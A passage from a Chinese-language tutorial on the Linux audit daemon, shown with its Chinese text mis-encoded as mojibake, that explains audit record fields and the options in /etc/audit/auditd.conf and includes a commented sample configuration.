ä¸ºç³»ç»Ÿè°ƒç”¨æ—¶çš„å‰å››ä¸ªargumentsï¼Œè¿™äº›argumentsä¾èµ–äºä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¯ä»¥ä½¿ç”¨ausearchæ¥æŸ¥çœ‹è§£é‡Šï¼ˆéƒ¨åˆ†å‚æ•°å¯ä»¥æ‰“å°å‡ºæ•°å€¼å…·ä½“çš„è§£é‡Šï¼‰ã€‚ items=1 è¡¨ç¤ºè·Ÿåœ¨ç³»ç»Ÿè°ƒç”¨åï¼Œè¡¥å……è®°å½•çš„ä¸ªæ•°ã€‚ ppid=2354 çˆ¶è¿›ç¨‹IDï¼Œå¦‚bashçš„IDã€‚ pid=30729 è¿›ç¨‹Idï¼Œå³ä¸ºlsè¿›ç¨‹çš„IDã€‚æˆ‘ä»¬é€šè¿‡psæ¥æŸ¥è¯¢ï¼Œå¯ä»¥çœ‹åˆ°bashçš„è¿›ç¨‹ä¸ppidæ˜¯å¯¹åº”çš„: linux-xdYUnA:/home/audit_test # ps -aux | grep bash lbh 2354 0.0 0.0 115376 2100 pts/1 S+ Apr11 0:00 bash root 12478 0.0 0.0 115888 2608 pts/0 Ss Apr11 0:00 -bash root 13329 0.1 0.0 115888 2612 pts/2 Ss 11:15 0:00 -bash root 15531 0.0 0.0 112652 972 pts/2 S+ 11:15 0:00 grep --color=auto bash root 30707 0.0 0.0 115888 2632 pts/1 Ss Apr11 0:00 -bash å…³äº/etc/audit/auditd.confçš„é…ç½® log_file =/var/log/audit/audit.log å®¡è®¡æ—¥å¿—æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ã€‚ å¦‚æœæ‚¨é…ç½®å®ˆæŠ¤è¿›ç¨‹å‘é™¤é»˜è®¤/var/log/audit/å¤–çš„ç›®å½•ä¸­å†™æ—¥å¿—æ–‡ä»¶æ—¶ï¼Œ ä¸€å®šè¦ä¿®æ”¹å®ƒä¸Šé¢çš„æ–‡ä»¶æƒé™, ä½¿å¾—åªæœ‰æ ¹ç”¨æˆ·æœ‰è¯»ã€å†™å’Œæ‰§è¡Œæƒé™ æ‰€æœ‰å…¶ä»–ç”¨æˆ·éƒ½ä¸èƒ½è®¿é—®è¿™ä¸ªç›®å½•æˆ–è¿™ä¸ªç›®å½•ä¸­çš„æ—¥å¿—æ–‡ä»¶ã€‚ | log_format = RAW å†™æ—¥å¿—æ—¶è¦ä½¿ç”¨çš„æ ¼å¼ã€‚ å½“è®¾ç½®ä¸ºRAWæ—¶ï¼Œæ•°æ®ä¼šä»¥ä»å†…æ ¸ä¸­æ£€ç´¢åˆ°çš„æ ¼å¼å†™åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ã€‚ å½“è®¾ç½®ä¸ºNOLOGæ—¶ï¼Œæ•°æ®ä¸ä¼šå†™åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œ ä½†æ˜¯å¦‚æœç”¨dispatcheré€‰é¡¹æŒ‡å®šäº†ä¸€ä¸ªï¼Œåˆ™æ•°æ®ä»ç„¶ä¼šå‘é€åˆ°å®¡è®¡äº‹ä»¶è°ƒåº¦ç¨‹åºä¸­ | log_group = root æ—¥å¿—æ‰€å±ç»„ | priority_boost = 4 å®¡è®¡åº”é‡‡ç”¨å¤šå°‘ä¼˜å…ˆçº§æ¨è¿›å®ˆæŠ¤è¿›ç¨‹ã€‚å¿…é¡»æ˜¯éè´Ÿæ•°ã€‚0è¡¨ç¤ºæ²¡æœ‰å˜åŒ– | flush = INCREMENTAL å¤šé•¿æ—¶é—´å‘æ—¥å¿—æ–‡ä»¶ä¸­å†™ä¸€æ¬¡æ•°æ®ã€‚å€¼å¯ä»¥æ˜¯NONEã€INCREMENTALã€DATAå’ŒSYNCä¹‹ä¸€ã€‚ å¦‚æœè®¾ç½®ä¸ºNONEï¼Œåˆ™ä¸éœ€è¦åšç‰¹æ®ŠåŠªåŠ›æ¥å°†æ•°æ® åˆ·æ–°åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ã€‚ å¦‚æœè®¾ç½®ä¸ºINCREMENTALï¼Œåˆ™ç”¨freqé€‰é¡¹çš„å€¼ç¡®å®šå¤šé•¿æ—¶é—´å‘ç”Ÿä¸€æ¬¡å‘ç£ç›˜çš„åˆ·æ–°ã€‚ å¦‚æœè®¾ç½®ä¸ºDATAï¼Œåˆ™å®¡è®¡æ•°æ®å’Œæ—¥å¿—æ–‡ä»¶ä¸€ç›´æ˜¯åŒæ­¥çš„ã€‚ å¦‚æœè®¾ç½®ä¸ºSYNCï¼Œåˆ™æ¯æ¬¡å†™åˆ°æ—¥å¿—æ–‡ä»¶æ—¶ï¼Œæ•°æ®å’Œå…ƒæ•°æ®æ˜¯åŒæ­¥çš„ã€‚ | freq = 20 å¦‚æœflushè®¾ç½®ä¸ºINCREMETNALï¼Œå®¡è®¡å®ˆæŠ¤è¿›ç¨‹åœ¨å†™åˆ°æ—¥å¿—æ–‡ä»¶ä¸­å‰ä»å†…æ ¸ä¸­æ¥æ”¶çš„è®°å½•æ•° | num_logs = 5 max_log_file_actionè®¾ç½®ä¸ºROTATEæ—¶è¦ä¿å­˜çš„æ—¥å¿—æ–‡ä»¶æ•°ç›®ã€‚å¿…é¡»æ˜¯0~99ä¹‹é—´çš„æ•°ã€‚ å¦‚æœè®¾ç½®ä¸ºå°äº2ï¼Œåˆ™ä¸ä¼šå¾ªç¯æ—¥å¿—ã€‚ å¦‚æœé€’å¢äº†æ—¥å¿—æ–‡ä»¶çš„æ•°ç›®ï¼Œå°±å¯èƒ½æœ‰å¿…è¦é€’å¢/etc/audit/audit.rulesä¸­çš„å†…æ ¸backlogè®¾ç½®å€¼ï¼Œ ä»¥ä¾¿ç•™å‡ºæ—¥å¿—å¾ªç¯çš„æ—¶é—´ã€‚ å¦‚æœæ²¡æœ‰è®¾ ç½®num_logså€¼ï¼Œå®ƒå°±é»˜è®¤ä¸º0ï¼Œæ„å‘³ç€ä»æ¥ä¸å¾ªç¯æ—¥å¿—æ–‡ä»¶ã€‚ å½“è¾¾åˆ°æŒ‡å®šæ–‡ä»¶å®¹é‡åä¼šå¾ªç¯æ—¥å¿—æ–‡ä»¶ï¼Œä½†æ˜¯åªä¼šä¿å­˜ä¸€å®šæ•°ç›®çš„è€æ–‡ä»¶ï¼Œè¿™ä¸ªæ•°ç›®ç”±num_logså‚æ•°æŒ‡å®šã€‚ è€æ–‡ä»¶çš„æ–‡ä»¶åå°†ä¸ºaudit.log.Nï¼Œå…¶ä¸­ Næ˜¯ä¸€ä¸ªæ•°å­—ã€‚è¿™ä¸ªæ•°å­—è¶Šå¤§ï¼Œåˆ™æ–‡ä»¶è¶Šè€ã€‚ | disp_qos = lossy æ§åˆ¶è°ƒåº¦ç¨‹åºä¸å®¡è®¡å®ˆæŠ¤è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ç±»å‹ã€‚æœ‰æ•ˆå€¼ä¸ºlossyå’Œlosslessã€‚ å¦‚æœè®¾ç½®ä¸ºlossyï¼Œè‹¥å®¡è®¡å®ˆæŠ¤è¿›ç¨‹ä¸è°ƒåº¦ç¨‹åºä¹‹é—´çš„ç¼“å†²åŒºå·²æ»¡ (ç¼“å†²åŒºä¸º128åƒå­—èŠ‚)ï¼Œ åˆ™å‘é€ç»™è°ƒåº¦ç¨‹åºçš„å¼•å…¥äº‹ä»¶ä¼šè¢«ä¸¢å¼ƒã€‚ç„¶è€Œï¼Œåªè¦log_formatæ²¡æœ‰è®¾ç½®ä¸ºnologï¼Œäº‹ä»¶å°±ä»ç„¶ä¼šå†™åˆ°ç£ç›˜ä¸­ã€‚ å¦‚æœè®¾ ç½®ä¸ºlosslessï¼Œåˆ™åœ¨å‘è°ƒåº¦ç¨‹åºå‘é€äº‹ä»¶ä¹‹å‰å’Œå°†æ—¥å¿—å†™åˆ°ç£ç›˜ä¹‹å‰ï¼Œè°ƒåº¦ç¨‹åºä¼šç­‰å¾…ç¼“å†²åŒºæœ‰è¶³å¤Ÿçš„ç©ºé—´ã€‚ | dispatcher = /sbin/audispd å½“å¯åŠ¨è¿™ä¸ªå®ˆæŠ¤è¿›ç¨‹æ—¶ï¼Œç”±å®¡è®¡å®ˆæŠ¤è¿›ç¨‹è‡ªåŠ¨å¯åŠ¨ç¨‹åºã€‚æ‰€æœ‰å®ˆæŠ¤è¿›ç¨‹éƒ½ä¼ é€’ç»™è¿™ä¸ªç¨‹åºã€‚ å¯ä»¥ç”¨å®ƒæ¥è¿›ä¸€æ­¥å®šåˆ¶æŠ¥è¡¨æˆ–è€…ä»¥ä¸æ‚¨çš„è‡ªå®šä¹‰åˆ†æç¨‹åºå…¼å®¹çš„ä¸åŒæ ¼å¼ äº§ç”Ÿå®ƒä»¬ã€‚ è‡ªå®šä¹‰ç¨‹åºçš„ç¤ºä¾‹ä»£ç å¯ä»¥åœ¨/usr/share/doc/audit- /skeleton.cä¸­æ‰¾åˆ°ã€‚ ç”±äºè°ƒåº¦ç¨‹åºç”¨æ ¹ç”¨æˆ·ç‰¹æƒè¿è¡Œï¼Œå› æ­¤ä½¿ç”¨è¿™ä¸ªé€‰é¡¹æ—¶è¦æå…¶å°å¿ƒã€‚è¿™ä¸ªé€‰é¡¹ä¸æ˜¯å¿…éœ€çš„ã€‚ | name_format = NONE æ ¼å¼: ##name = mydomain æ­¤é€‰é¡¹æ§åˆ¶è®¡ç®—æœºèŠ‚ç‚¹åå¦‚ä½•æ’å…¥åˆ°å®¡è®¡äº‹ä»¶æµä¸­ã€‚ å®ƒæœ‰å¦‚ä¸‹çš„é€‰æ‹©ï¼šnone, hostname, fqd, numeric, and user Noneæ„å‘³ç€æ²¡æœ‰è®¡ç®—æœºåè¢«æ’å…¥åˆ°å®¡è®¡äº‹ä»¶ä¸­ã€‚ hostnameé€šè¿‡gethostnameç³»ç»Ÿè°ƒç”¨è¿”å›çš„åç§°ã€‚ fqdæ„å‘³ç€å®ƒ=ä»¥ä¸»æœºåå’Œè§£å†³å®ƒä¸DNSçš„å®Œå…¨åˆæ ¼çš„åŸŸåï¼Œ numericç±»ä¼¼äºfqdé™¤è§£å†³æœ¬æœºçš„IPåœ°å€ï¼Œä¸ºäº†ä½¿ç”¨è¿™ä¸ªé€‰é¡¹ï¼Œ ä½ å¯èƒ½æƒ³è¦æµ‹è¯•'hostname -i'æˆ– 'domainname-i'è¿”å›ä¸€ä¸ªæ•°å­—åœ°å€, å¦å¤–ï¼Œæ­¤é€‰é¡¹ä¸å¦‚æœDHCPçš„ä½¿ç”¨æ˜¯å› ä¸ºä½ å¯ä»¥æœ‰ä¸åŒçš„åœ°å€ï¼Œåœ¨åŒä¸€å°æœºå™¨ä¸Šçš„æ—¶é—´æ¨èã€‚ ç”¨æˆ·æ˜¯ä»åç§°é€‰é¡¹ä¸­å®šä¹‰çš„å­—ç¬¦ä¸²ã€‚é»˜è®¤å€¼æ˜¯æ²¡æœ‰ | max_log_file = 6 ä»¥å…†å­—èŠ‚è¡¨ç¤ºçš„æœ€å¤§æ—¥å¿—æ–‡ä»¶å®¹é‡ã€‚å½“è¾¾åˆ°è¿™ä¸ªå®¹é‡æ—¶ï¼Œä¼šæ‰§è¡Œmax_log_file _actionæŒ‡å®šçš„åŠ¨ä½œ | max_log_file_action = ROTATE å½“è¾¾åˆ°max_log_fileçš„æ—¥å¿—æ–‡ä»¶å¤§å°æ—¶é‡‡å–çš„åŠ¨ä½œã€‚ å€¼å¿…é¡»æ˜¯IGNOREã€SYSLOGã€SUSPENDã€ROTATEå’ŒKEEP_LOGSä¹‹ ä¸€ã€‚ å¦‚æœè®¾ç½®ä¸ºIGNOREï¼Œåˆ™åœ¨æ—¥å¿—æ–‡ä»¶è¾¾åˆ°max_log_fileåä¸é‡‡å–åŠ¨ä½œã€‚ å¦‚æœè®¾ç½®ä¸ºSYSLOGï¼Œåˆ™å½“è¾¾åˆ°æ–‡ä»¶å®¹é‡æ—¶ä¼šå‘ç³»ç»Ÿæ—¥å¿—/var /log/messagesä¸­å†™å…¥ä¸€æ¡è­¦å‘Šã€‚ å¦‚æœè®¾ç½®ä¸ºSUSPENDï¼Œåˆ™å½“è¾¾åˆ°æ–‡ä»¶å®¹é‡åä¸ä¼šå‘æ—¥å¿—æ–‡ä»¶å†™å…¥å®¡è®¡æ¶ˆæ¯ã€‚ å¦‚æœè®¾ç½®ä¸ºROTATEï¼Œåˆ™å½“è¾¾ åˆ°æŒ‡å®šæ–‡ä»¶å®¹é‡åä¼šå¾ªç¯æ—¥å¿—æ–‡ä»¶ï¼Œä½†æ˜¯åªä¼šä¿å­˜ä¸€å®šæ•°ç›®çš„è€æ–‡ä»¶ï¼Œ è¿™ä¸ªæ•°ç›®ç”±num_logså‚æ•°æŒ‡å®šã€‚è€æ–‡ä»¶çš„æ–‡ä»¶åå°†ä¸ºaudit.log.Nï¼Œå…¶ä¸­ Næ˜¯ä¸€ä¸ªæ•°å­—ã€‚è¿™ä¸ªæ•°å­—è¶Šå¤§ï¼Œåˆ™æ–‡ä»¶è¶Šè€ã€‚ å¦‚æœè®¾ç½®ä¸ºKEEP_LOGSï¼Œåˆ™ä¼šå¾ªç¯æ—¥å¿—æ–‡ä»¶ï¼Œä½†æ˜¯ä¼šå¿½ç•¥num_logså‚æ•°ï¼Œå› æ­¤ä¸ä¼šåˆ é™¤æ—¥å¿—æ–‡ä»¶ space_left = 75 ä»¥å…†å­—èŠ‚è¡¨ç¤ºçš„ç£ç›˜ç©ºé—´æ•°é‡ã€‚ å½“è¾¾åˆ°è¿™ä¸ªæ°´å¹³æ—¶ï¼Œä¼šé‡‡å–space_left_actionå‚æ•°ä¸­çš„åŠ¨ä½œ | space_left_action = SYSLOG å½“ç£ç›˜ç©ºé—´é‡è¾¾åˆ°space_leftä¸­çš„å€¼æ—¶ï¼Œé‡‡å–è¿™ä¸ªåŠ¨ä½œã€‚ æœ‰æ•ˆå€¼ä¸ºIGNOREã€SYSLOGã€EMAILã€SUSPENDã€SINGLEå’Œ HALTã€‚ å¦‚æœè®¾ç½®ä¸ºIGNOREï¼Œåˆ™ä¸é‡‡å–åŠ¨ä½œã€‚ å¦‚æœè®¾ç½®ä¸ºSYSLOGï¼Œåˆ™å‘ç³»ç»Ÿæ—¥å¿—/var/log/messageså†™ä¸€æ¡è­¦å‘Šæ¶ˆæ¯ã€‚ å¦‚æœè®¾ç½®ä¸ºEMAILï¼Œåˆ™ä»action_mail_acctå‘è¿™ä¸ªåœ°å€å‘é€ä¸€å°ç”µå­é‚®ä»¶ï¼Œå¹¶å‘/var/log/messagesä¸­å†™ä¸€æ¡è­¦å‘Šæ¶ˆæ¯ã€‚ å¦‚æœè®¾ç½®ä¸º SUSPENDï¼Œåˆ™ä¸å†å‘å®¡è®¡æ—¥å¿—æ–‡ä»¶ä¸­å†™è­¦å‘Šæ¶ˆæ¯ã€‚ å¦‚æœè®¾ç½®ä¸ºSINGLEï¼Œåˆ™ç³»ç»Ÿå°†åœ¨å•ç”¨æˆ·æ¨¡å¼ä¸‹ã€‚ å¦‚æœè®¾ç½®ä¸ºSALTï¼Œåˆ™ç³»ç»Ÿä¼šå…³é—­ | action_mail_acct = root è´Ÿè´£ç»´æŠ¤å®¡è®¡å®ˆæŠ¤è¿›ç¨‹å’Œæ—¥å¿—çš„ç®¡ç†å‘˜çš„ç”µå­é‚®ä»¶åœ°å€ã€‚ å¦‚æœåœ°å€æ²¡æœ‰ä¸»æœºåï¼Œåˆ™å‡å®šä¸»æœºåä¸ºæœ¬åœ°åœ°å€ï¼Œæ¯”å¦‚rootã€‚ å¿…é¡»å®‰è£…sendmailå¹¶é…ç½®ä¸ºå‘æŒ‡å®šç”µå­é‚®ä»¶åœ°å€å‘é€ç”µå­é‚®ä»¶ | admin_space_left = 50 ä»¥å…†å­—èŠ‚è¡¨ç¤ºçš„ç£ç›˜ç©ºé—´æ•°é‡ã€‚ ç”¨è¿™ä¸ªé€‰é¡¹è®¾ç½®æ¯”space_left_actionæ›´å¤šçš„ä¸»åŠ¨æ€§åŠ¨ä½œï¼Œ ä»¥é˜²ä¸‡ä¸€space_left_actionæ²¡æœ‰è®©ç®¡ç†å‘˜é‡Šæ”¾ä»»ä½•ç£ç›˜ç©ºé—´ã€‚ è¿™ä¸ªå€¼åº”å°äºspace_left_actionã€‚ å¦‚æœè¾¾åˆ°è¿™ä¸ªæ°´å¹³ï¼Œåˆ™ä¼šé‡‡å– admin_space_left_action æ‰€æŒ‡å®šçš„åŠ¨ä½œ | admin_space_left_action = SUSPEND å½“è‡ªç”±ç£ç›˜ç©ºé—´é‡è¾¾åˆ°admin_space_leftæŒ‡å®šçš„å€¼æ—¶ï¼Œåˆ™é‡‡å–åŠ¨ä½œã€‚ æœ‰æ•ˆå€¼ä¸ºIGNOREã€SYSLOGã€EMAILã€SUSPENDã€SINGLEå’ŒHALTã€‚ ä¸è¿™äº›å€¼å…³è”çš„åŠ¨ä½œä¸ space_left_action ä¸­çš„ç›¸åŒã€‚ | disk_full_action = SUSPEND å¦‚æœå«æœ‰è¿™ä¸ªå®¡è®¡æ–‡ä»¶çš„åˆ†åŒºå·²æ»¡ï¼Œåˆ™é‡‡å–è¿™ä¸ªåŠ¨ä½œã€‚ å¯èƒ½å€¼ä¸ºIGNOREã€SYSLOGã€SUSPENDã€SINGLEå’ŒHALTã€‚ä¸è¿™äº›å€¼å…³è”çš„åŠ¨ä½œä¸ space_left_action ä¸­çš„ç›¸åŒã€‚ | disk_error_action = SUSPEND å¦‚æœåœ¨å†™å®¡è®¡æ—¥å¿—æˆ–å¾ªç¯æ—¥å¿—æ–‡ä»¶æ—¶æ£€æµ‹åˆ°é”™è¯¯æ—¶é‡‡å–çš„åŠ¨ä½œã€‚ å€¼å¿…é¡»æ˜¯IGNOREã€SYSLOGã€SUSPENDã€SINGLEå’ŒHALTä¹‹ä¸€ã€‚ ä¸è¿™äº›å€¼å…³çš„åŠ¨ä½œä¸space_left_actionä¸­çš„ç›¸åŒ | tcp_listen_port = è¿™æ˜¯åœ¨èŒƒå›´1ã€65535ï¼Œä¸€ä¸ªæ•°å­—å€¼ï¼Œå¦‚æœæŒ‡å®šï¼ŒåŸå› auditdå¬åœ¨ä»è¿œç¨‹ç³»ç»Ÿå®¡è®¡è®°å½•ç›¸åº”çš„TCPç«¯å£ã€‚ å®¡è®¡ç¨‹åºå¯èƒ½ä¸tcp_wrappersã€‚ ä½ å¯èƒ½æƒ³æ§åˆ¶åœ¨hosts.allowå…¥å£è®¿é—®å’Œå¦è®¤æ–‡ä»¶ã€‚ | tcp_listen_queue = 5 è¿™æ˜¯ä¸€ä¸ªæ•°å­—å€¼ï¼Œè¿™è¡¨æ˜æœ‰å¤šå°‘ç­‰å¾…ï¼ˆè¦æ±‚ä½†UNACæ¥å—ï¼‰çš„è¿æ¥æ˜¯å…è®¸çš„ã€‚ é»˜è®¤å€¼æ˜¯5ã€‚è®¾ç½®è¿‡å°çš„å¯èƒ½å¯¼è‡´è¿æ¥è¢«æ‹’ç»ï¼Œå¦‚æœå¤ªå¤šä¸»æœºå¼€å§‹åœ¨å®Œå…¨ç›¸åŒçš„æ—¶é—´ï¼Œå¦‚ç”µæºæ•…éšœåã€‚ | tcp_max_per_addr = 1 æ ¼å¼: tcp_client_ports = 1024-65535 tcp_client_max_idle = 0 è¿™æ˜¯ä¸€ä¸ªæ•°å­—å€¼ï¼Œè¯¥å€¼è¡¨ç¤ºä¸€ä¸ªåœ°å€å…è®¸æœ‰å¤šå°‘ä¸ªå¹¶å‘è¿æ¥ã€‚ é»˜è®¤ä¸º1ï¼Œæœ€å¤§ä¸º1024ã€‚ è®¾ç½®è¿‡å¤§å¯èƒ½ä¼šå…è®¸æ‹’ç»æœåŠ¡æ”»å‡»çš„æ—¥å¿—æœåŠ¡å™¨ã€‚ è¿˜è¦æ³¨æ„çš„æ˜¯ï¼Œå†…æ ¸å†…éƒ¨æœ‰ä¸€ä¸ªæœ€å¤§çš„ï¼Œæœ€ç»ˆå°†é˜²æ­¢è¿™ç§å³ä½¿auditdå…è®¸å®ƒé€šè¿‡é…ç½®ã€‚ åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œé»˜è®¤åº”è¯¥æ˜¯è¶³å¤Ÿé™¤éå†™ä¸€ä¸ªè‡ªå®šä¹‰çš„æ¢å¤è„šæœ¬è¿è¡Œæå‡ºæœªå‘é€äº‹ä»¶ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å°†å¢åŠ çš„æ•°é‡åªæœ‰è¶³å¤Ÿå¤§ï¼Œè®©å®ƒåœ¨è¿‡ã€‚ | enable_krb5 = no å¦‚æœè®¾ç½®ä¸º\"yes\"ï¼ŒKerberos 5å°†ç”¨äºè®¤è¯å’ŒåŠ å¯†ã€‚é»˜è®¤æ˜¯\"no\"ã€‚ | krb5_principal = auditd è¿™æ˜¯è¿™ä¸ªæœåŠ¡å™¨çš„ä¸»è¦ã€‚ é»˜è®¤æ˜¯\"auditd\"ã€‚é‰´äºè¿™ç§é»˜è®¤æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¼šå¯»æ‰¾ä¸€ä¸ªåä¸º`auditd/ hostname@EXAMPLE .COM`å­˜å‚¨åœ¨/etc/audit/audit.key. è®¤è¯æœ¬èº«å…¶ä¸­ä¸»æœºæ˜¯æœåŠ¡å™¨çš„ä¸»æœºåç§°ï¼Œå¦‚DNSæŸ¥æ‰¾å…¶IPåœ°å€è¿”å›ã€‚ | krb5_key_file = /etc/audit/audit.key è¿™ä¸ªå®¢æˆ·çš„ä¸»è¦è´Ÿè´£äººçš„ä½ç½®ã€‚è¯·æ³¨æ„ï¼Œå¯†é’¥æ–‡ä»¶å¿…é¡»ç”±æ ¹å’Œæ¨¡å¼0400æ‰€æ‹¥æœ‰ã€‚é»˜è®¤çš„æ˜¯/etc/audit/audit.key | æ³¨è§£ auditdå½“max_actionè®¾ç½®ä¸ºrotateæ—¶ï¼Œæ—¥å¿—åˆ†éš”å…·æœ‰å»¶æ—¶æ€§ï¼Œä¸”åç¼€æ•°å­—æœ€å¤§çš„æ˜¯æœ€æ—§çš„logæ–‡ä»¶ ç ”ç©¶auditæ—¥å¿—è§„åˆ™ï¼Œæœ¬æ–‡ä¸ºè¿›ç¨‹é…ç½®: # å®¡è®¡æ—¥å¿—æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ã€‚å¦‚æœæ‚¨é…ç½®å®ˆæŠ¤è¿›ç¨‹å‘é™¤é»˜è®¤/var/log/audit/å¤–çš„ç›®å½•ä¸­å†™æ—¥å¿—æ–‡ä»¶æ—¶ï¼Œ # ä¸€å®šè¦ä¿®æ”¹å®ƒä¸Šé¢çš„æ–‡ä»¶æƒé™ï¼Œä½¿å¾—åªæœ‰æ ¹ç”¨æˆ·æœ‰è¯»ã€å†™å’Œæ‰§è¡Œæƒé™ã€‚æ‰€æœ‰å…¶ä»–ç”¨æˆ·éƒ½ä¸èƒ½è®¿é—®è¿™ä¸ª # ç›®å½•æˆ–è¿™ä¸ªç›®å½•ä¸­çš„æ—¥å¿—æ–‡ä»¶ã€‚ log_file =/var/log/audit/audit.log # å†™æ—¥å¿—æ—¶è¦ä½¿ç”¨çš„æ ¼å¼ã€‚å½“è®¾ç½®ä¸ºRAWæ—¶ï¼Œæ•°æ®ä¼šä»¥ä»å†…æ ¸ä¸­æ£€ç´¢åˆ°çš„æ ¼å¼å†™åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ã€‚å½“è®¾ç½® # ä¸ºNOLOGæ—¶ï¼Œæ•°æ®ä¸ä¼šå†™åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œä½†æ˜¯å¦‚æœç”¨dispatcheré€‰é¡¹æŒ‡å®šäº†ä¸€ä¸ªï¼Œåˆ™æ•°æ®ä»ç„¶ä¼šå‘é€ # åˆ°å®¡è®¡äº‹ä»¶è°ƒåº¦ç¨‹åºä¸­ log_format = RAW # æ—¥å¿—æ‰€å±ç»„ log_group = root # å®¡è®¡åº”é‡‡ç”¨å¤šå°‘ä¼˜å…ˆçº§æ¨è¿›å®ˆæŠ¤è¿›ç¨‹ã€‚å¿…é¡»æ˜¯éè´Ÿæ•°ã€‚0è¡¨ç¤ºæ²¡æœ‰å˜åŒ–ã€‚ priority_boost = 4 # å¤šé•¿æ—¶é—´å‘æ—¥å¿—æ–‡ä»¶ä¸­å†™ä¸€æ¬¡æ•°æ®ã€‚å€¼å¯ä»¥æ˜¯NONEã€INCREMENTALã€DATAå’ŒSYNCä¹‹ä¸€ã€‚å¦‚æœè®¾ç½®ä¸º # NONEï¼Œåˆ™ä¸éœ€è¦åšç‰¹æ®ŠåŠªåŠ›æ¥å°†æ•°æ® åˆ·æ–°åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ã€‚å¦‚æœè®¾ç½®ä¸ºINCREMENTALï¼Œåˆ™ç”¨freqé€‰é¡¹ # çš„å€¼ç¡®å®šå¤šé•¿æ—¶é—´å‘ç”Ÿä¸€æ¬¡å‘ç£ç›˜çš„åˆ·æ–°ã€‚å¦‚æœè®¾ç½®ä¸ºDATAï¼Œåˆ™å®¡è®¡æ•°æ®å’Œæ—¥å¿—æ–‡ä»¶ä¸€ç›´æ˜¯åŒæ­¥çš„ã€‚ # å¦‚æœè®¾ç½®ä¸ºSYNCï¼Œåˆ™æ¯æ¬¡å†™åˆ°æ—¥å¿—æ–‡ä»¶æ—¶ï¼Œæ•°æ®å’Œå…ƒæ•°æ®æ˜¯åŒæ­¥çš„ã€‚ flush = INCREMENTAL # å¦‚æœflushè®¾ç½®ä¸ºINCREMETNALï¼Œå®¡è®¡å®ˆæŠ¤è¿›ç¨‹åœ¨å†™åˆ°æ—¥å¿—æ–‡ä»¶ä¸­å‰ä»å†…æ ¸ä¸­æ¥æ”¶çš„è®°å½•æ•° freq = 20 #max_log_file_actionè®¾ç½®ä¸ºROTATEæ—¶è¦ä¿å­˜çš„æ—¥å¿—æ–‡ä»¶æ•°ç›®ã€‚å¿…é¡»æ˜¯0~99ä¹‹é—´çš„æ•°ã€‚å¦‚æœè®¾ç½®ä¸ºå°äº2ï¼Œ # åˆ™ä¸ä¼šå¾ªç¯æ—¥å¿—ã€‚å¦‚æœé€’ å¢äº†æ—¥å¿—æ–‡ä»¶çš„æ•°ç›®ï¼Œå°±å¯èƒ½æœ‰å¿…è¦é€’å¢/etc/audit/audit.rulesä¸­çš„å†…æ ¸ # backlogè®¾ç½®å€¼ï¼Œä»¥ä¾¿ç•™å‡ºæ—¥å¿—å¾ªç¯çš„æ—¶é—´ã€‚å¦‚æœæ²¡æœ‰è®¾ ç½®num_logså€¼ï¼Œå®ƒå°±é»˜è®¤ä¸º0ï¼Œæ„å‘³ç€ä»æ¥ä¸å¾ªç¯æ—¥å¿—æ–‡ä»¶ã€‚ num_logs = 5 # æ§åˆ¶è°ƒåº¦ç¨‹åºä¸å®¡è®¡å®ˆæŠ¤è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ç±»å‹ã€‚æœ‰æ•ˆå€¼ä¸ºlossyå’Œlosslessã€‚å¦‚æœè®¾ç½®ä¸ºlossyï¼Œ # è‹¥å®¡è®¡å®ˆæŠ¤è¿›ç¨‹ä¸è°ƒåº¦ç¨‹åºä¹‹é—´çš„ç¼“å†²åŒºå·²æ»¡ (ç¼“å†²åŒºä¸º128åƒå­—èŠ‚)ï¼Œåˆ™å‘é€ç»™è°ƒåº¦ç¨‹åºçš„å¼•å…¥ # äº‹ä»¶ä¼šè¢«ä¸¢å¼ƒã€‚ç„¶è€Œï¼Œåªè¦log_formatæ²¡æœ‰è®¾ç½®ä¸ºnologï¼Œäº‹ä»¶å°±ä»ç„¶ä¼šå†™åˆ°ç£ç›˜ä¸­ã€‚å¦‚æœè®¾ ç½®ä¸ºlosslessï¼Œ # åˆ™åœ¨å‘è°ƒåº¦ç¨‹åºå‘é€äº‹ä»¶ä¹‹å‰å’Œå°†æ—¥å¿—å†™åˆ°ç£ç›˜ä¹‹å‰ï¼Œè°ƒåº¦ç¨‹åºä¼šç­‰å¾…ç¼“å†²åŒºæœ‰è¶³å¤Ÿçš„ç©ºé—´ã€‚ disp_qos = lossy # å½“å¯åŠ¨è¿™ä¸ªå®ˆæŠ¤è¿›ç¨‹æ—¶ï¼Œç”±å®¡è®¡å®ˆæŠ¤è¿›ç¨‹è‡ªåŠ¨å¯åŠ¨ç¨‹åºã€‚æ‰€æœ‰å®ˆæŠ¤è¿›ç¨‹éƒ½ä¼ é€’ç»™è¿™ä¸ªç¨‹åºã€‚å¯ä»¥ç”¨ # å®ƒæ¥è¿›ä¸€æ­¥å®šåˆ¶æŠ¥è¡¨æˆ–è€…ä»¥ä¸æ‚¨çš„è‡ªå®šä¹‰åˆ†æç¨‹åºå…¼å®¹çš„ä¸åŒæ ¼å¼ äº§ç”Ÿå®ƒä»¬ã€‚è‡ªå®šä¹‰ç¨‹åºçš„ç¤ºä¾‹ # ä»£ç å¯ä»¥åœ¨/usr/share/doc/audit- /skeleton.cä¸­æ‰¾åˆ°ã€‚ç”±äºè°ƒåº¦ç¨‹åºç”¨æ ¹ç”¨æˆ·ç‰¹æƒè¿è¡Œï¼Œå› æ­¤ä½¿ç”¨ # è¿™ä¸ªé€‰é¡¹æ—¶è¦æå…¶å°å¿ƒã€‚è¿™ä¸ªé€‰é¡¹ä¸æ˜¯å¿…éœ€çš„ã€‚ dispatcher = /sbin/audispd # 